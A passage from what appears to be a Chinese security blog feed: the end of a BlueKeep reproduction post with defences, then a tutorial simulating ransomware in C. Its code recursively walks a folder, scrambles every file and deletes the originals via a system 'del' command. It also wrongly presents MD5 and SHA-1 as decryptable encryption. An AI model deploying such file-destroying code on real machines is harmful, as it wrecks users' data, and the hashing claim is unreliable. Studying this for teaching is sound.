目标IP地址主机的系统版本</span><br></pre></td></tr></table></figure><p>靶机蓝屏，攻击成功。</p><img src="/posts/2d03ac3f/2.2.13.png" class="" title="靶机蓝屏"><h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul><li>微软官方已经发布更新补丁(包括Windows XP等停止维护的版本)，请用户及时进行补丁更新</li><li>若用户不需要用到远程桌面服务，建议禁用该服务</li><li>在防火墙中对TCP 3389端口进行阻断</li><li>开启系统防火墙或IP安全策略限制来源IP，即只允许指定IP访问</li><li>启用网络级认证(NLA)，此方案适用于Windows 7 、 Windows Server 2008 和 Windows Server 2008 R2</li><li>安装必要的防火墙或杀毒软件，关注安全公司的漏洞报告或防御文章</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;终于来到了这一步，你你你，就是我第一个复现的漏洞啦！CVE-2019-0708又称bluekeep。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>勒索病毒中的加解密原理</title>
    <link href="http://example.com/posts/5ec21076.html"/>
    <id>http://example.com/posts/5ec21076.html</id>
    <published>2022-05-23T04:53:40.733Z</published>
    <updated>2022-05-24T07:21:14.841Z</updated>
    
    <content type="html"><![CDATA[<p>勒索病毒是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。</p><p>现在就用C语言来实现一下系统文件加密及解密功能，简单模拟勒索病毒的加解密原理。</p><span id="more"></span><h1 id="1-对系统文件进行简单加解密"><a href="#1-对系统文件进行简单加解密" class="headerlink" title="1. 对系统文件进行简单加解密"></a>1. 对系统文件进行简单加解密</h1><p>假设桌面存在如下图所示的文件夹“l30n9ry0n”，我们需要获取其信息再进行文件遍历及加密操作，需要用到操作系统API、加密算法，像勒索病毒一样可以还原文件的，还需要解密算法。</p><img src="/posts/5ec21076/1.1.1.png" class=""><p>1.在编写一个简单的加密函数前，首先需要创建文件并执行打开、读写操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName)</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="comment">//1.打开文件</span></span><br><span class="line">    FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;r+&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.每隔一个字节插入一个字节数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.保存关闭</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">jiami(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n\\作业.txt&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.2.png" class="" title="实现文件打开操作"><p>2.计算文件大小，查看该文件可知共142字节。</p><img src="/posts/5ec21076/1.1.3.png" class="" title="查看文件大小"><p>在C代码里的基本流程为：</p><ul><li>设置光标(文件指针)到文件末尾</li><li>计算光标距离文件头的字节数</li><li>设置光标位置到文件头(便于后面的加密操作)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.获取文件大小</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;<span class="comment">//文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.4.png" class=""><p>3.循环插入字节实现简单的加密。</p><p>如果在进行文件操作时，遇到权限不够的情况下，需要进行相关的提权操作，再进行加密处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line"><span class="type">char</span>* tmp;</span><br><span class="line"><span class="type">int</span> read_size;</span><br><span class="line">tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>((size + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">read_size = fread(tmp, <span class="keyword">sizeof</span>(<span class="type">char</span>), size, fp);</span><br><span class="line">tmp[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="comment">//printf(&quot;读取字符串为：%s %d %d\n&quot;, tmp, read_size, strlen(tmp));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.每隔一个字节插入一个字节数据</span></span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span>* pTxt;</span><br><span class="line">FILE* fpw = fopen(<span class="string">&quot;ddd.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);                           <span class="comment">//写入文件</span></span><br><span class="line">pTxt = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * (<span class="built_in">strlen</span>(tmp) * <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = size; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">ch = tmp[i];</span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">pTxt[<span class="number">2</span> * i] = ch;</span><br><span class="line">pTxt[<span class="number">2</span> * i - <span class="number">1</span>] = code;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pTxt[<span class="number">2</span> * i] = ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%d %c %c\n&quot;, i, ch, pTxt[2 * i - 1]);</span></span><br><span class="line">&#125;</span><br><span class="line">pTxt[size * <span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;操作后字符串：%s %d\n&quot;</span>, pTxt, <span class="built_in">strlen</span>(pTxt));</span><br><span class="line">fwrite(pTxt, <span class="keyword">sizeof</span>(<span class="type">char</span>), size * <span class="number">2</span>, fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.5.png" class=""><p>运行完后在C代码当前目录下生成一个<code>ddd.txt</code>文件，发现一个简单的加密或扰乱完成。</p><img src="/posts/5ec21076/1.1.6.png" class=""><p>为什么文件显示的字节与计算的字节不一样？对于文本流，因为会执行行末字符映射，所以文本文件的字节数可能和程序写入的字节数不同。基于此，可以用二进制方式读写文件。同时，使用二进制可以读取大型文件如<code>.exe</code>文件、音视频文件等。</p><p>4.编写一个遍历文件夹的函数，实现对整个目录进行加密处理。</p><p>通常遍历文件夹采用递归，依次遍历某个目录的文件夹，深度搜索文件夹中的内容，如果是文件就加密，如果是文件夹就继续深度搜索，直至找到文件依次返回，从而实现整个目录的文件遍历。</p><ul><li>调用<code>GetCurrentDirectory()</code>函数获取当前目录</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//jiami(&quot;C:\\Users\\xiuzhang\\Desktop\\文件夹加密\\test.txt&quot;);</span></span><br><span class="line"><span class="comment">//获取当前文件夹</span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调用<code>FindFirstFile()</code>函数获取目录下第一个文件</li><li>如果找到第一个文件，则循环调用<code>FindNextFile()</code>函数获取下一个文件</li><li>如果找到的是文件夹，则拼接新的文件夹路径继续递归遍历文件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span> (findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取当前文件夹</span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//遍历当前目录下的文件</span></span><br><span class="line">findFile(buff);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.7.png" class=""><p>5.完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                     <span class="comment">//文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line"><span class="comment">//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line">    <span class="comment">//在当前目录下构造一个pathName+test路径</span></span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建pathName+test文件</span></span><br><span class="line">FILE* fpw = fopen(temp, <span class="string">&quot;wb&quot;</span>);         <span class="comment">//写入文件</span></span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123; </span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">fputc(code, fpw);</span><br><span class="line"><span class="comment">//printf(&quot;%c\n&quot;, ch);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);<span class="comment">//执行删除命令</span></span><br><span class="line">rename(temp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span>(findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//加密文件</span></span><br><span class="line">jiami(temp, pathName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line"><span class="comment">//加密指定文件夹目录 建议使用虚拟机执行</span></span><br><span class="line">findFile(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.8.png" class=""><p>可以看到修改日期是今天，创建日期也是今天，因为原本的文件都被删除了。并且文件都加了密，文件文件乱码、图片不能显示、EXE也不能执行。</p><img src="/posts/5ec21076/1.1.9.png" class=""><p>6.编写解密功能。</p><p>当我们中了勒索病毒，就需要解密。在真实环境中，MD5、hash、SHA-1都是比较常用的加密算法。编写解密功能有两种方法：</p><ul><li>全部读入内存，修改后重新存入文件</li><li>边读边写到另一新建文件，要修改的部分修改后存入新建文件，其它部分原封不动写入，写完删除加密文件，并将这个新文件改为加密文件的名字</li></ul><figure class="highlight 